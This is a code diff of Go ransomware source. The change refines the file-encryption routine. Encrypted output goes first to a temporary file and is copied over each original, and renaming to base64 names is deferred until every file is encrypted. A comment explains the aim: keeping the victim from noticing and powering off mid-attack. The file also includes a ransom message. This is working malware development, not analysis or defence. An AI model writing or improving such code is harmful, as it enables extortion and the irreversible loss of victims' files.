@@ -29,6 +29,9 @@ var (
 
 	// Time to keep trying persist new keys on server
 	SecondsToTimeout = 5.0
+
+	// Create a slice to store the files to rename before encryption
+	FilesToRename []cmd.File
 )
 
 func main() {
@@ -111,7 +114,7 @@ func encryptFiles() {
 
 	wg.Add(1)
 
-	// Indexing files in concurrently thread
+	// Indexing files in a concurrently thread
 	go func() {
 		// Decrease the wg count after finish this goroutine
 		defer wg.Done()
@@ -168,6 +171,19 @@ func encryptFiles() {
 	// Wait for all goroutines to finish
 	wg.Wait()
 
+	// Rename the files after all have been encrypted
+	for _, file := range FilesToRename {
+		// Replace the file name by the base64 equivalent
+		newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
+
+		// Rename the original file to the base64 equivalent
+		err := os.Rename(file.Path, newpath+cmd.EncryptionExtension)
+		if err != nil {
+			log.Println(err)
+			continue
+		}
+	}
+
 	message := `
 	<pre>
 	YOUR FILES HAVE BEEN ENCRYPTED USING A STRONG
@@ -193,7 +209,7 @@ func encryptFiles() {
 
 // Encrypt a single file
 func encryptFile(file cmd.File, enckey string) {
-	// Open the file
+	// Open the file read only
 	inFile, err := os.Open(file.Path)
 	if err != nil {
 		log.Println(err)
@@ -218,18 +234,21 @@ func encryptFile(file cmd.File, enckey string) {
 	// Get a stream for encrypt/decrypt in counter mode (best performance I guess)
 	stream := cipher.NewCTR(block, iv)
 
-	// Replace the file name by the base64 equivalent
-	newpath := strings.Replace(file.Path, file.Name(), base64.StdEncoding.EncodeToString([]byte(file.Name())), -1)
-
-	// Create/Open the output file
-	outFile, err := os.OpenFile(newpath+cmd.EncryptionExtension, os.O_WRONLY|os.O_CREATE|os.O_APPEND|os.O_TRUNC, 0600)
+	// We need make a temporary copy of the file for store the encrypted content
+	// before move then to the original file
+	// This is necessary because if the victim has many files it can observe the
+	// encrypted names appear and turn off the computer before the process is completed
+	// The files will be renamed later, after all have been encrypted properly
+	//
+	// Create/Open the temporary output file
+	outFile, err := os.OpenFile(cmd.TempDir+file.Name(), os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
 	if err != nil {
 		log.Println(err)
 		return
 	}
 	defer outFile.Close()
 
-	// Write the Initialization Vector (iv) as the first bytes block
+	// Write the Initialization Vector (iv) as the first block
 	// of the encrypted file
 	outFile.Write(iv)
 
@@ -242,10 +261,39 @@ func encryptFile(file cmd.File, enckey string) {
 		return
 	}
 
-	// Here we need to close the file manually to be able to delete then
+	// Close both files before proceed
 	inFile.Close()
-	err = os.Remove(file.Path)
+	outFile.Close()
+
+	// Reopen the original file write-only, truncating then
+	inFile, err = os.OpenFile(file.Path, os.O_WRONLY|os.O_TRUNC, 0600)
 	if err != nil {
-		log.Println("Cannot delete original file, skipping...")
+		log.Println(err)
+		return
 	}
+	defer inFile.Close()
+
+	// Reopen the temporary file read-only
+	outFile, err = os.Open(cmd.TempDir + file.Name())
+	if err != nil {
+		log.Println(err)
+		return
+	}
+	defer outFile.Close()
+
+	// Copy the temporary file to the original file
+	if _, err = io.Copy(inFile, outFile); err != nil {
+		log.Println(err)
+		return
+	}
+
+	// Remove the temporary file
+	outFile.Close()
+	err = os.Remove(cmd.TempDir + file.Name())
+	if err != nil {
+		log.Println("Cannot delete temporary file, skipping...")
+	}
+
+	// Schedule the file to rename it later
+	FilesToRename = append(FilesToRename, file)
 }
